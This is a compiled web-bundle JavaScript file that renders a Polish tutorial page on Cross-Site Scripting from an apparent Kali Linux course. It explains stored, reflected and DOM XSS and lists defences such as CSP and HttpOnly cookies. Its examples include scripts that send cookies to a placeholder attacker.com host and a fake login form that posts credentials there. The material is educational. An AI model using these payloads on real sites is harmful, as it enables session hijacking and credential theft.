"use strict";(self.webpackChunkmy_page=self.webpackChunkmy_page||[]).push([[2203],{28453:(e,n,s)=>{s.d(n,{R:()=>t,x:()=>o});var r=s(96540);const i={},a=r.createContext(i);function t(e){const n=r.useContext(a);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:t(e.components),r.createElement(a.Provider,{value:n},e.children)}},99254:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>p,frontMatter:()=>t,metadata:()=>r,toc:()=>d});const r=JSON.parse('{"id":"kurs-kali-linux/cross-site-scripting","title":"\ud83c\udfaf Cross-Site Scripting (XSS)","description":"Cross-Site Scripting (XSS) to jeden z najcz\u0119\u015bciej wykorzystywanych wektor\xf3w ataku na aplikacje webowe. Polega na wstrzykni\u0119ciu z\u0142o\u015bliwego kodu JavaScript do aplikacji, co mo\u017ce prowadzi\u0107 do przej\u0119cia sesji u\u017cytkownika, wykradania danych lub wykonywania nieautoryzowanych operacji.","source":"@site/docs/kurs-kali-linux/09-cross-site-scripting.md","sourceDirName":"kurs-kali-linux","slug":"/kurs-kali-linux/cross-site-scripting","permalink":"/docs/kurs-kali-linux/cross-site-scripting","draft":false,"unlisted":false,"editUrl":"https://github.com/przemyslvw/my-page/edit/master/docs/kurs-kali-linux/09-cross-site-scripting.md","tags":[],"version":"current","sidebarPosition":9,"frontMatter":{"id":"cross-site-scripting","title":"\ud83c\udfaf Cross-Site Scripting (XSS)","sidebar_position":9},"sidebar":"tutorialSidebar","previous":{"title":"\ud83d\udd10 Broken Authentication & Session Management","permalink":"/docs/kurs-kali-linux/broken-authentication"},"next":{"title":"\ud83d\udd10 Insecure Direct Object References (IDOR) & Broken Access Control","permalink":"/docs/kurs-kali-linux/idor-broken-access"}}');var i=s(74848),a=s(28453);const t={id:"cross-site-scripting",title:"\ud83c\udfaf Cross-Site Scripting (XSS)",sidebar_position:9},o="\ud83c\udfaf Cross-Site Scripting (XSS)",c={},d=[{value:"\ud83d\udd25 Rodzaje atak\xf3w XSS",id:"-rodzaje-atak\xf3w-xss",level:2},{value:"<strong>1\ufe0f\u20e3 Stored XSS (Trwa\u0142y XSS)</strong>",id:"1\ufe0f\u20e3-stored-xss-trwa\u0142y-xss",level:3},{value:"<strong>Przyk\u0142ad ataku Stored XSS</strong>",id:"przyk\u0142ad-ataku-stored-xss",level:4},{value:"<strong>2\ufe0f\u20e3 Reflected XSS (Odbity XSS)</strong>",id:"2\ufe0f\u20e3-reflected-xss-odbity-xss",level:3},{value:"<strong>Przyk\u0142ad ataku Reflected XSS</strong>",id:"przyk\u0142ad-ataku-reflected-xss",level:4},{value:"<strong>3\ufe0f\u20e3 DOM-based XSS</strong>",id:"3\ufe0f\u20e3-dom-based-xss",level:3},{value:"<strong>Przyk\u0142ad ataku DOM XSS</strong>",id:"przyk\u0142ad-ataku-dom-xss",level:4},{value:"\ud83d\uded1 Wykorzystanie XSS do kradzie\u017cy sesji",id:"-wykorzystanie-xss-do-kradzie\u017cy-sesji",level:2},{value:"<strong>1\ufe0f\u20e3 Przechwytywanie sesji</strong>",id:"1\ufe0f\u20e3-przechwytywanie-sesji",level:4},{value:"<strong>2\ufe0f\u20e3 Tworzenie fa\u0142szywych formularzy</strong>",id:"2\ufe0f\u20e3-tworzenie-fa\u0142szywych-formularzy",level:4},{value:"\ud83d\udd10 Zabezpieczenia przed XSS",id:"-zabezpieczenia-przed-xss",level:2}];function l(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"-cross-site-scripting-xss",children:"\ud83c\udfaf Cross-Site Scripting (XSS)"})}),"\n",(0,i.jsx)(n.p,{children:"Cross-Site Scripting (XSS) to jeden z najcz\u0119\u015bciej wykorzystywanych wektor\xf3w ataku na aplikacje webowe. Polega na wstrzykni\u0119ciu z\u0142o\u015bliwego kodu JavaScript do aplikacji, co mo\u017ce prowadzi\u0107 do przej\u0119cia sesji u\u017cytkownika, wykradania danych lub wykonywania nieautoryzowanych operacji."}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"-rodzaje-atak\xf3w-xss",children:"\ud83d\udd25 Rodzaje atak\xf3w XSS"}),"\n",(0,i.jsx)(n.h3,{id:"1\ufe0f\u20e3-stored-xss-trwa\u0142y-xss",children:(0,i.jsx)(n.strong,{children:"1\ufe0f\u20e3 Stored XSS (Trwa\u0142y XSS)"})}),"\n",(0,i.jsx)(n.p,{children:"Atakuj\u0105cy zapisuje z\u0142o\u015bliwy skrypt w bazie danych lub na serwerze, a nast\u0119pnie jest on wykonywany w przegl\u0105darce u\u017cytkownika podczas odwiedzenia strony."}),"\n",(0,i.jsx)(n.h4,{id:"przyk\u0142ad-ataku-stored-xss",children:(0,i.jsx)(n.strong,{children:"Przyk\u0142ad ataku Stored XSS"})}),"\n",(0,i.jsx)(n.p,{children:"Podatna aplikacja zapisuje komentarze bez filtrowania tre\u015bci:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-html",children:'<input type="text" name="comment" value="">\n'})}),"\n",(0,i.jsx)(n.p,{children:"Atakuj\u0105cy wpisuje:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-html",children:"<script>document.location='http://attacker.com/steal?cookie='+document.cookie<\/script>\n"})}),"\n",(0,i.jsx)(n.p,{children:"Ka\u017cdy u\u017cytkownik, kt\xf3ry odwiedzi stron\u0119, wykona z\u0142o\u015bliwy kod JavaScript."}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"2\ufe0f\u20e3-reflected-xss-odbity-xss",children:(0,i.jsx)(n.strong,{children:"2\ufe0f\u20e3 Reflected XSS (Odbity XSS)"})}),"\n",(0,i.jsx)(n.p,{children:"Z\u0142o\u015bliwy skrypt jest wstrzykiwany w parametrach URL i wykonywany przez przegl\u0105dark\u0119 ofiary."}),"\n",(0,i.jsx)(n.h4,{id:"przyk\u0142ad-ataku-reflected-xss",children:(0,i.jsx)(n.strong,{children:"Przyk\u0142ad ataku Reflected XSS"})}),"\n",(0,i.jsx)(n.p,{children:"Podatna aplikacja wy\u015bwietla dane z URL:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:'<?php echo $_GET["query"]; ?>\n'})}),"\n",(0,i.jsx)(n.p,{children:"Atakuj\u0105cy wysy\u0142a ofierze link:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-http",children:"http://example.com/search?query=<script>alert('XSS')<\/script>\n"})}),"\n",(0,i.jsx)(n.p,{children:"Je\u015bli u\u017cytkownik otworzy ten link, przegl\u0105darka wykona z\u0142o\u015bliwy kod."}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"3\ufe0f\u20e3-dom-based-xss",children:(0,i.jsx)(n.strong,{children:"3\ufe0f\u20e3 DOM-based XSS"})}),"\n",(0,i.jsx)(n.p,{children:"Wyst\u0119puje, gdy z\u0142o\u015bliwy skrypt jest wykonywany po stronie przegl\u0105darki bez interakcji z serwerem."}),"\n",(0,i.jsx)(n.h4,{id:"przyk\u0142ad-ataku-dom-xss",children:(0,i.jsx)(n.strong,{children:"Przyk\u0142ad ataku DOM XSS"})}),"\n",(0,i.jsx)(n.p,{children:"Podatny kod JavaScript:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-javascript",children:'document.write("Wyszukiwane: " + location.hash);\n'})}),"\n",(0,i.jsx)(n.p,{children:"Atakuj\u0105cy wysy\u0142a:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-http",children:"http://example.com/#<script>alert('XSS')<\/script>\n"})}),"\n",(0,i.jsx)(n.p,{children:"Gdy u\u017cytkownik otworzy link, przegl\u0105darka wykona kod JavaScript."}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"-wykorzystanie-xss-do-kradzie\u017cy-sesji",children:"\ud83d\uded1 Wykorzystanie XSS do kradzie\u017cy sesji"}),"\n",(0,i.jsx)(n.p,{children:"XSS pozwala na przej\u0119cie sesji u\u017cytkownika poprzez wykradanie cookies."}),"\n",(0,i.jsx)(n.h4,{id:"1\ufe0f\u20e3-przechwytywanie-sesji",children:(0,i.jsx)(n.strong,{children:"1\ufe0f\u20e3 Przechwytywanie sesji"})}),"\n",(0,i.jsx)(n.p,{children:"Atakuj\u0105cy wstrzykuje skrypt:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-javascript",children:"<script>\n  fetch('http://attacker.com/steal?cookie=' + document.cookie);\n<\/script>\n"})}),"\n",(0,i.jsx)(n.p,{children:"Ofiara odwiedza stron\u0119 \u2192 jej sesja jest wysy\u0142ana do serwera atakuj\u0105cego."}),"\n",(0,i.jsx)(n.h4,{id:"2\ufe0f\u20e3-tworzenie-fa\u0142szywych-formularzy",children:(0,i.jsx)(n.strong,{children:"2\ufe0f\u20e3 Tworzenie fa\u0142szywych formularzy"})}),"\n",(0,i.jsx)(n.p,{children:"Mo\u017cna stworzy\u0107 formularz logowania, kt\xf3ry kradnie dane u\u017cytkownika:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-html",children:'<form action="http://attacker.com/steal" method="POST">\n  <input type="text" name="username" placeholder="Login">\n  <input type="password" name="password" placeholder="Has\u0142o">\n  <input type="submit" value="Zaloguj si\u0119">\n</form>\n'})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"-zabezpieczenia-przed-xss",children:"\ud83d\udd10 Zabezpieczenia przed XSS"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Filtrowanie wej\u015bcia"})," \u2013 u\u017cycie ",(0,i.jsx)(n.code,{children:"htmlspecialchars()"})," w PHP lub ",(0,i.jsx)(n.code,{children:"encodeURIComponent()"})," w JS."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"CSP (Content Security Policy)"})," \u2013 blokowanie wykonywania inline JavaScript."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"HttpOnly dla cookies"})," \u2013 zabezpiecza przed odczytem JavaScript."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Sanityzacja danych na wej\u015bciu i wyj\u015bciu"})," \u2013 usuwanie podejrzanych znak\xf3w."]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"Przyk\u0142ad ochrony CSP:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-html",children:"<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; script-src 'self'\">\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsxs)(n.p,{children:["Ataki XSS mog\u0105 prowadzi\u0107 do przej\u0119cia kont i eskalacji uprawnie\u0144. Kolejnym krokiem b\u0119dzie analiza podatno\u015bci ",(0,i.jsx)(n.strong,{children:"Insecure Direct Object References (IDOR) & Broken Access Control"}),"! \ud83d\ude80"]})]})}function p(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(l,{...e})}):l(e)}}}]);